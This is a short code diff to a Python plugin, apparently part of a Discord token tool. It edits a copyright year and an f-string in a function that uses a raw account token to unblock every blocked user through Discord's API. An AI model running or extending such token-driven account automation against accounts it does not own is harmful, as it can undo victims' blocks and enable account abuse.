@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0
+# Copyright (c) 2026 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -21,7 +21,7 @@ try:
     def UnblockUsers(token, blocked_users):
         for user in blocked_users:
             try:
-                response = requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+user['id'], 
+                response = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{user['id']}", 
                                       headers={'Authorization': token, 'Content-Type': 'application/json'})
                 if response.status_code == 204 or response.status_code == 200:
                     print(f"{SUCCESS} Status:{red} Unblocked {white}| User:{red} {user['user']['username']}", reset)
